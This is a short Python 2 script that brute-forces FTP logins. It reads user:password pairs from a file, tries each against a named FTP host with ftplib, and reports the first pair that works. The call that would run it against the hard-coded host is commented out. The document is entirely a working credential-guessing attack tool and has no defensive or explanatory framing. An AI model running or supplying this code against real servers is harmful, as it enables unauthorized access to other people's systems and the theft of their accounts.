import ftplib

def bruteLogin(hostname, passwordFile):
    pf = open(passwordFile, 'r')
    for line in pf.readlines():
        user = line.split(':')[0]
        password = line.split(':')[1].strip('\n').strip('\r')
        print '[+] Trying: ' + user + '/' + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user, password)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + user + '/' + password
            ftp.quit()
            return (user, password)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)

host = 'ftp.anandcsingh.com'
passwordFile = 'userpass.txt'
#bruteLogin(host, passwordFile)
        

        
